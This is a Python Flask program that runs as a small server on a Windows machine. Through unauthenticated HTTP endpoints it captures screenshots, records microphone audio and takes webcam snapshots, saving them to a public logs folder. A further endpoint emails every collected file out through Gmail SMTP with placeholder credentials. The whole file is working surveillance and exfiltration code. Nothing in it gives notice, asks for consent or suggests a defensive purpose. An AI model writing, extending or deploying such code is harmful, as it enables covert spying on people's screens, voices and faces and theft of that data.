from flask import Flask, request, jsonify
import os
import time
import cv2
import sounddevice as sd
from scipy.io.wavfile import write as write_wav
from PIL import ImageGrab
from cryptography.fernet import Fernet
import shutil
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import re

app = Flask(__name__)

# Path to save files
BASE_PATH = 'C:/Users/Public/Logs/'
os.makedirs(BASE_PATH, exist_ok=True)

def capture_screenshot():
    screen_path = os.path.join(BASE_PATH, 'screenshot.png')
    pic = ImageGrab.grab()
    pic.save(screen_path)
    return screen_path

def record_microphone():
    fs = 44100
    seconds = 10
    mic_path = os.path.join(BASE_PATH, 'mic_recording.wav')
    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write_wav(mic_path, fs, recording)
    return mic_path

def capture_webcam():
    cam = cv2.VideoCapture(0)
    ret, img = cam.read()
    cam_path = os.path.join(BASE_PATH, 'webcam_snapshot.jpg')
    cv2.imwrite(cam_path, img)
    cam.release()
    return cam_path

def send_email():
    email_address = 'your_email@example.com'
    password = 'your_password'
    
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = email_address
    msg['Subject'] = 'Logs'
    
    body = 'Logs attached'
    msg.attach(MIMEText(body, 'plain'))
    
    for filename in os.listdir(BASE_PATH):
        filepath = os.path.join(BASE_PATH, filename)
        attachment = open(filepath, 'rb')
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={filename}')
        msg.attach(part)
    
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email_address, password)
    text = msg.as_string()
    server.sendmail(email_address, email_address, text)
    server.quit()
    
    return "Email sent successfully"

@app.route('/screenshot', methods=['POST'])
def screenshot_endpoint():
    try:
        screenshot_path = capture_screenshot()
        return jsonify({"message": "Screenshot captured", "path": screenshot_path}), 200
    except Exception as e:
        return jsonify({"message": str(e)}), 500

@app.route('/microphone', methods=['POST'])
def microphone_endpoint():
    try:
        mic_path = record_microphone()
        return jsonify({"message": "Microphone recorded", "path": mic_path}), 200
    except Exception as e:
        return jsonify({"message": str(e)}), 500

@app.route('/webcam', methods=['POST'])
def webcam_endpoint():
    try:
        webcam_path = capture_webcam()
        return jsonify({"message": "Webcam snapshot captured", "path": webcam_path}), 200
    except Exception as e:
        return jsonify({"message": str(e)}), 500

@app.route('/send_email', methods=['POST'])
def send_email_endpoint():
    try:
        send_email()
        return jsonify({"message": "Email sent successfully"}), 200
    except Exception as e:
        return jsonify({"message": str(e)}), 500

if __name__ == '__main__':
    app.run(port=5000)
